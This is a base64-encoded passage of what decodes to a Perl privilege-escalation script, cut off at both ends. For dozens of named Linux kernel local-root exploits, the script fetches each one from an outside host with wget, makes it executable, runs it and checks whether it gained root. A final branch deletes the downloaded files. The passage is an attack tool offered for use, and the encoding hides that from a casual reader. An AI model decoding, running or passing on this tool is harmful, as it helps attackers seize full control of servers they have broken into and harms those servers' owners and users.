b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOS01NS0yMDA3LXBydjgiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi45LTU1LTIwMDctcHJ2OCIpOw0Kc3lzdGVtKCIuLzIuNi45LTU1LTIwMDctcHJ2OCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOS01NS0yMDA4LXBydjgiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi45LTU1LTIwMDgtcHJ2OCIpOw0Kc3lzdGVtKCIuLzIuNi45LTU1LTIwMDgtcHJ2OCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOS02NzIwMDgiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi45LTY3MjAwOCIpOw0Kc3lzdGVtKCIuLzIuNi45LTY3MjAwOCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOS4yIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuOS4yIik7DQpzeXN0ZW0oIi4vMi42LjkuMiIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOTEtMjAwNyIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjkxLTIwMDciKTsNCnN5c3RlbSgiLi8yLjYuOTEtMjAwNyIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yMDA3Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAyMDA3Iik7DQpzeXN0ZW0oIi4vMjAwNyIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yMDA5LWxvY2FsIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyMDA5LWxvY2FsIik7DQpzeXN0ZW0oIi4vMjAwOS1sb2NhbCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yMDA5LXd1bmRlcmJhciIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMjAwOS13dW5kZXJiYXIiKTsNCnN5c3RlbSgiLi8yMDA5LXd1bmRlcmJhciIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yMDExIExvY2FsUm9vdCBGb3IgMi42LjE4LTEyOC5lbDUiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIwMTEgTG9jYWxSb290IEZvciAyLjYuMTgtMTI4LmVsNSIpOw0Kc3lzdGVtKCIuLzIwMTEgTG9jYWxSb290IEZvciAyLjYuMTgtMTI4LmVsNSIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yMSIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMjEiKTsNCnN5c3RlbSgiLi8yMSIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8zIik7DQpzeXN0ZW0oImNobW9kIDc3NyAzIik7DQpzeXN0ZW0oIi4vMyIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8zLjQuNi05LTIwMDciKTsNCnN5c3RlbSgiY2htb2QgNzc3IDMuNC42LTktMjAwNyIpOw0Kc3lzdGVtKCIuLzMuNC42LTktMjAwNyIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8zMSIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMzEiKTsNCnN5c3RlbSgiLi8zMSIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8zNi1yYzEiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDM2LXJjMSIpOw0Kc3lzdGVtKCIuLzM2LXJjMSIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC80Iik7DQpzeXN0ZW0oImNobW9kIDc3NyA0Iik7DQpzeXN0ZW0oIi4vNCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC80NCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgNDQiKTsNCnN5c3RlbSgiLi80NCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC80NyIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgNDciKTsNCnN5c3RlbSgiLi80NyIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC81Iik7DQpzeXN0ZW0oImNobW9kIDc3NyA1Iik7DQpzeXN0ZW0oIi4vNSIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC81MCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgNTAiKTsNCnN5c3RlbSgiLi81MCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC81NCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgNTQiKTsNCnN5c3RlbSgiLi81NCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC82Iik7DQpzeXN0ZW0oImNobW9kIDc3NyA2Iik7DQpzeXN0ZW0oIi4vNiIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC82NyIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgNjciKTsNCnN5c3RlbSgiLi82NyIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC83Iik7DQpzeXN0ZW0oImNobW9kIDc3NyA3Iik7DQpzeXN0ZW0oIi4vNyIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC83LTIiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDctMiIpOw0Kc3lzdGVtKCIuLzctMiIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC83eCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgN3giKTsNCnN5c3RlbSgiLi83eCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC84Iik7DQpzeXN0ZW0oImNobW9kIDc3NyA4Iik7DQpzeXN0ZW0oIi4vOCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC85Iik7DQpzeXN0ZW0oImNobW9kIDc3NyA5Iik7DQpzeXN0ZW0oIi4vOSIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC85MCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgOTAiKTsNCnN5c3RlbSgiLi85MCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC85NCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgOTQiKTsNCnN5c3RlbSgiLi85NCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC9MaW51eF8yLjYoMSkuMTIiKTsNCnN5c3RlbSgiY2htb2QgNzc3IExpbnV4XzIuNigxKS4xMiIpOw0Kc3lzdGVtKCIuL0xpbnV4XzIuNigxKS4xMiIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC9MaW51eF8yLjYuMTIiKTsNCnN5c3RlbSgiY2htb2QgNzc3IExpbnV4XzIuNi4xMiIpOw0Kc3lzdGVtKCIuL0xpbnV4XzIuNi4xMiIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC9MaW51eF8yLjYuOS1qb29seXNoaXQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IExpbnV4XzIuNi45LWpvb2x5c2hpdCIpOw0Kc3lzdGVtKCIuLzIuNi4xOC0yMDExIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L2FjaWQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IGFjaWQiKTsNCnN5c3RlbSgiLi9hY2lkIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L2QzdmlsIik7DQpzeXN0ZW0oImNobW9kIDc3NyBkM3ZpbCIpOw0Kc3lzdGVtKCIuL2QzdmlsIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L2V4cDEiKTsNCnN5c3RlbSgiY2htb2QgNzc3IGV4cDEiKTsNCnN5c3RlbSgiLi9leHAxIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L2V4cDIiKTsNCnN5c3RlbSgiY2htb2QgNzc3IGV4cDIiKTsNCnN5c3RlbSgiLi9leHAyIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L2V4cDMiKTsNCnN5c3RlbSgiY2htb2QgNzc3IGV4cDMiKTsNCnN5c3RlbSgiLi9leHAzIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L2V4cGxvaXQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IGV4cGxvaXQiKTsNCnN5c3RlbSgiLi9leHBsb2l0Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L2Z1bGwtbmVsc29uIik7DQpzeXN0ZW0oImNobW9kIDc3NyBmdWxsLW5lbHNvbiIpOw0Kc3lzdGVtKCIuL2Z1bGwtbmVsc29uIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L2dheXJvcyIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgZ2F5cm9zIik7DQpzeXN0ZW0oIi4vZ2F5cm9zIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L2xlbmlzLnNoIik7DQpzeXN0ZW0oImNobW9kIDc3NyBsZW5pcy5zaCIpOw0Kc3lzdGVtKCIuL2xlbmlzLnNoIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L2xvY2FsLTIuNi45LTIwMDUtMjAwNiIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgbG9jYWwtMi42LjktMjAwNS0yMDA2Iik7DQpzeXN0ZW0oIi4vbG9jYWwtMi42LjktMjAwNS0yMDA2Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L2xvY2FsLXJvb3QtZXhwbG9pdC1nYXlyb3MiKTsNCnN5c3RlbSgiY2htb2QgNzc3IGxvY2FsLXJvb3QtZXhwbG9pdC1nYXlyb3MiKTsNCnN5c3RlbSgiLi9sb2NhbC1yb290LWV4cGxvaXQtZ2F5cm9zIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L3ByaXY0Iik7DQpzeXN0ZW0oImNobW9kIDc3NyBwcml2NCIpOw0Kc3lzdGVtKCIuL3ByaXY0Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L3B3bmtlcm5lbCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgcHdua2VybmVsIik7DQpzeXN0ZW0oIi4vcHdua2VybmVsIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L3Jvb3QucHkiKTsNCnN5c3RlbSgiY2htb2QgNzc3IHJvb3QucHkiKTsNCnN5c3RlbSgiLi9yb290LnB5Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L3J1bngiKTsNCnN5c3RlbSgiY2htb2QgNzc3IHJ1bngiKTsNCnN5c3RlbSgiLi9ydW54Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L3Rpdm9saSIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgdGl2b2xpIik7DQpzeXN0ZW0oIi4vdGl2b2xpIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L3VidW50dSIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgdWJ1bnR1Iik7DQpzeXN0ZW0oIi4vdWJ1bnR1Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L3Ztc3BsaWNlLWxvY2FsLXJvb3QtZXhwbG9pdCIpOw0Kc3lzdGVtKCJjaG1vZCA3Nzcgdm1zcGxpY2UtbG9jYWwtcm9vdC1leHBsb2l0Iik7DQpzeXN0ZW0oIi4vdm1zcGxpY2UtbG9jYWwtcm9vdC1leHBsb2l0Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L3oxZC0yMDExIik7DQpzeXN0ZW0oImNobW9kIDc3NyB6MWQtMjAxMSIpOw0Kc3lzdGVtKCIuLzIuNi4xOC0yMDExIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnByaW50ICJnZXQgcm9vdC4uLj8/P1xuIjsNCnByaW50ICIjPVsrXT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PVsrXT0jXG4iOw0KcHJpbnQgInwgICAgICAgICAgICAgVGhhbmtzIEZvciBVc2luZyBpdCAgICAgICAgICAgICAgICAgIHxcbiI7DQpwcmludCAifCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfFxuIjsNCnByaW50ICJ8ICAgICAgIEpvaW4gdXMgb24gaHR0cDovL3RoZWNyb3dzY3Jldy5vcmcgICAgICAgICB8XG4iOw0KcHJpbnQgIiM9WytdPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09WytdPSNcbiI7DQoNCn0NCmlmICgkQVJHVlswXSA9fiAiZGVsIiApIA0Kew0Kc3lzdGVtKCJybSAxLTIiKTsNCnN5c3RlbSgicm0gMS0zIik7DQpzeXN0ZW0oInJtIDEtNCIpOw0Kc3lzdGVtKCJybSAyLjYuMTgtMzc0LjEyLjEuZWw1LTIwMTIiKTsNCnN5c3RlbSgicm0gMTAiKTsNCnN5c3RlbSgicm0gMTEiKTsNCnN5c3RlbSgicm0gMTIiKTsNCnN5c3RlbSgicm0gMTQiKTsNCnN5c3RlbSgicm0gMTUuc2giKTsNCnN5c3RlbSgicm0gMTUxNTAiKTsNCnN5c3RlbSgicm0gMTUyMDAiKTsNCnN5c3RlbSgicm0gMTYiKTsNCnN5c3RlbSgicm0gMTYtMSIpOw0Kc3lzdGVtKCJybSAxOCIpOw0Kc3lzdGVtKCJybSAxOC01Iik7DQpzeXN0ZW0oInJtIDIiKTsNCnN5c3RlbSgicm0gMi0xIik7DQpzeXN0ZW0oInJtIDItNi0zMi00Ni0yMDExIik7DQpzeXN0ZW0oInJtIDItNi0zNyIpOw0Kc3lzdGVtKCJybSAyLTYtOS0yMDA1Iik7DQpzeXN0ZW0oInJtIDItNi05LTIwMDYiKTsNCnN5c3RlbSgicm0gMi4zNC0yMDExRXhwbG9pdDEiKTsNCnN5c3RlbSgicm0gMi40LjIxLTIwMDYiKTsNCnN5c3RlbSgicm0gMi40LjM2LjkyLjYuMjcuNSAtIDIwMDggTG9jYWwgcm9vdCIpOw0Kc3lzdGVtKCJybSAyLjYuMTgtMTY0LTIwMTAiKTsNCnN5c3RlbSgicm0gMi42LjE4LTE5NCIpOw0Kc3lzdGVtKCJybSAyLjYuMTgtMTk0LjEtMjAxMCIpOw0Kc3lzdGVtKCJybSAyLjYuMTgtMTk0LjItMjAxMCIpOw0Kc3lzdGVtKCJybSAyLjYuMTgtMjAxMSIpOw0Kc3lzdGVtKCJybSAyLjYuMTgtMjc0LTIwMTEiKTsNCnN5c3RlbSgicm0gMi42LjE4LTYteDg2LTIwMTEiKTsNCnN5c3RlbSgicm0gMi42LjItaG9vbHlzaGl0Iik7DQpzeXN0ZW0oInJtIDIuNi4yMCIpOw0Kc3lzdGVtKCJybSAyLjYuMjAtMiIpOw0Kc3lzdGVtKCJybSAyLjYuMjIiKTsNCnN5c3RlbSgicm0gMi42LjIyLTIwMDgiKTsNCnN5c3RlbSgicm0gMi42LjIyLTYtODZfNjQtMjAwNyIpOw0Kc3lzdGVtKCJybSAyLjYuMjMtMi42LjI0Iik7DQpzeXN0ZW0oInJtIDIuNi4yMy0yLjYuMjRfMiIpOw0Kc3lzdGVtKCJybSAyLjYuMjMtMi42LjI3Iik7DQpzeXN0ZW0oInJtIDIuNi4yNCIpOw0Kc3lzdGVtKCJybSAyLjYuMjcuNy1nZW5lcmkiKTsNCnN5c3RlbSgicm0gMi42LjI4LTIwMTEiKTsNCnN5c3RlbSgicm0gMi42LjMyLTQ2LjEuQkhzbXAiKTsNCnN5c3RlbSgicm0gMi42LjMzIik7DQpzeXN0ZW0oInJtIDIuNi4zMy0yMDExIik7DQpzeXN0ZW0oInJtIDIuNi4zNC0yMDExIik7DQpzeXN0ZW0oInJtIDIuNi4zNC0yMDExRXhwbG9pdDEiKTsNCnN5c3RlbSgicm0gMi42LjM0LTIwMTFFeHBsb2l0MiIpOw0Kc3lzdGVtKCJybSAyLjYuMzciKTsNCnN5c3RlbSgicm0gMi42LjM3LXJjMiIpOw0Kc3lzdGVtKCJybSAyLjYuNV9ob29seXNoaXQiKTsNCnN5c3RlbSgicm0gMi42LjYtMzQiKTsNCnN5c3RlbSgicm0gMi42LjYtMzRfaDAwbHlzaGl0Iik7DQpzeXN0ZW0oInJtIDIuNi42X2gwMGx5c2hpdCIpOw0Kc3lzdGVtKCJybSAyLjYuN19oMDBseXNoaXQiKTsNCnN5c3RlbSgicm0gMi42LjgtMjAwOC45LTY3LTIwMDgiKTsNCnN5c3RlbSgicm0gMi42LjgtNV9oMDBseXNoaXQiKTsNCnN5c3RlbSgicm0gMi42LjhfaDAwbHlzaGl0Iik7DQpzeXN0ZW0oInJtIDIuNi45Iik7DQpzeXN0ZW0oInJtIDIuNi45LTIwMDQiKTsNCnN5c3RlbSgicm0gMi42LjktMjAwOCIpOw0Kc3lzdGVtKCJybSAyLjYuOS0zNCIpOw0Kc3lzdGVtKCJybSAyLjYuOS00Mi4wLjMuRUxzbXAiKTsNCnN5c3RlbSgicm0gMi42LjktNDIuMC4zLkVMc21wLTIwMDYiKTsNCnN5c3RlbSgicm0gMi42LjktNTUiKTsNCnN5c3RlbSgicm0gMi42LjktNTUtMjAwNy1wcnY4Iik7DQpzeXN0ZW0oInJtIDIuNi45LTU1LTIwMDgtcHJ2OCIpOw0Kc3lzdGVtKCJybSAyLjYuOS02NzIwMDgiKTsNCnN5c3RlbSgicm0gMi42LjkuMiIpOw0Kc3lzdGVtKCJybSAyLjYuOTEtMjAwNyIpOw0Kc3lzdGVtKCJybSAyMDA3Iik7DQpzeXN0ZW0oInJtIDIwMDktbG9jYWwiKTsNCnN5c3RlbSgicm0gMjAwOS13dW5kZXJiYXIiKTsNCnN5c3RlbSgicm0gMjAxMSBMb2NhbFJvb3QgRm9yIDIuNi4xOC0xMjguZWw1Iik7DQpzeXN0ZW0oInJtIDIxIik7DQpzeXN0ZW0oInJtIDMiKTsNCnN5c3RlbSgicm0gMy40LjYtOS0yMDA3Iik7DQpzeXN0ZW0oInJtIDMxIik7DQpzeXN0ZW0oInJtIDM2LXJjMSIpOw0Kc3lzdGVtKCJybSA0Iik7DQpzeXN0ZW0oInJtIDQ0Iik7DQpzeXN0ZW0oInJtIDQ3